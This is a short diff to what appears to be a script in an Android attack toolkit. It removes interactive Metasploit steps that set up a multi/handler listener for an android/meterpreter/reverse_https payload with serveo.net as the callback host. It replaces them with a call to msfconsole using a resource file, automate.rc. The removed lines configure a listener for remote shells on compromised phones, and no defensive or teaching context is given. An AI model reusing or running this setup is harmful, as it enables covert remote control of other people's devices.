@@ -1,6 +1,3 @@
-clear && echo [+] Opening Metasploit | lolcat && msfconsole
-use exploit/multi/handler
-set payload android/meterpreter/reverse_https
-set LHOST serveo.net
-set LPORT (enter your port, press enter, then type exploit and press enter.)
-
+cd
+clear
+msfconsole -r automate.rc
